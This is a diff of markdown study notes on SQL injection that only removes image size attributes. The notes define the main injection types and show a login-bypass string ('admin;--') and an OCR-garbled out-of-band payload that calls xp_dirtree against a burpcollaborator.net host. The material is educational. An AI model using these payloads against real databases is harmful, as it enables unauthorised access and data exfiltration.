@@ -46,7 +46,7 @@ Where a different ip address is broadcasted for the DNS name, that is pointing t
 **'admin;--**
 **Types of SQL Injection**
 
-![In-Band (Classic) SQL Injection Inferential (Blind) Boolean Out-of-Band Error Union Time ](media/Attacks-image1.jpeg){width="5.0in" height="1.9166666666666667in"}
+![In-Band (Classic) SQL Injection Inferential (Blind) Boolean Out-of-Band Error Union Time ](media/Attacks-image1.jpeg)
 1.  **In-Band SQL Injection**
     -   **In-band SQLi occurs when the attacker uses the same communication channel to both launch the attack and gather the result of the attack**
         -   **Retrieved data is presented directly in the application web page**
@@ -58,12 +58,12 @@ Where a different ip address is broadcasted for the DNS name, that is pointing t
 2.  **Error-Based SQLi**
     -   **Error-based SQLi is an in-band SQLi technique that forces the database to generate an error, giving the attacker information upon which to refine their injection**
 
-![](media/Attacks-image2.jpg){width="5.0in" height="1.3125in"}
+![](media/Attacks-image2.jpg)
 
 3.  **Union-Based SQLi**
     -   **Union-based SQLi is an in-band SQLi technique that leverages the UNION SQL operator to combine the results of two queries into a single result set**
 
-![](media/Attacks-image3.jpg){width="5.0in" height="1.71875in"}
+![](media/Attacks-image3.jpg)
 
 4.  **Inferential (Blind) SQL Injection**
     -   **SQLi vulnerability where there is no actual transfer of data via the web application**
@@ -77,9 +77,9 @@ Where a different ip address is broadcasted for the DNS name, that is pointing t
 5.  **Boolean-based Blind SQLi**
     -   **Boolean-based SQLi is a blind SQLi technique that uses Boolean conditions to return a different result depending on whether the query returns a TRUE or FALSE result**
 
-![](media/Attacks-image4.jpeg){width="5.0in" height="2.25in"}
+![](media/Attacks-image4.jpeg)
 
-![](media/Attacks-image5.jpeg){width="5.0in" height="2.6145833333333335in"}
+![](media/Attacks-image5.jpeg)
 6.  **Time-based Blind SQLi**
     -   **Time-based SQLi is a blind SQLi technique that relies on the database pausing for a specified amount of time, then returning the results, indicating a successful SQL query execution**
     -   **Example Query**
@@ -94,7 +94,7 @@ If the first character of the administrator's hashed password is an 'a', wait fo
         -   **A variety of protocols can be used (ex. DNS, HTTP)**
     -   **Example Payload:**
 
-![, exec master. .xp_dirtree ' //øefdymgw105w9inae8mg4dfrgim9ay. burpcollaborator .net/a• ](media/Attacks-image6.jpg){width="5.0in" height="0.2916666666666667in"}
+![, exec master. .xp_dirtree ' //øefdymgw105w9inae8mg4dfrgim9ay. burpcollaborator .net/a• ](media/Attacks-image6.jpg)
 **Tools**
 
 [https://github.com/sqlmapproje ct/sqlmap](https://github.com/sqlmapproje%20ct/sqlmap)
